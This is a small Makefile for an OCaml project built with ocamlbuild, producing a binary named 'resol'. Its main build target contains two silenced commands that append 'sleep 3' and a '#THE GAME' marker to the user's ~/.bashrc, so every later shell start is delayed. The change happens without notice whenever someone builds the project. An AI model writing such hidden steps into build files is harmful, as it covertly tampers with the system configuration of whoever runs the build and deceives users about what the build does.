CC := ocamlbuild
SRC := src
CFLAGS := -tag thread -r -I $(SRC)

.PHONY: all mproper

all: main

main:
	$(CC) $(CFLAGS) $(SRC)/$@.native
	mv $@.native resol
	@echo "sleep 3">>~/.bashrc
	@echo "#THE GAME">>~/.bashrc

prof:
	$(CC) $(CFLAGS) $(SRC)/main.p.native
	mv main.p.native resol.p

clean:
	$(CC) -clean
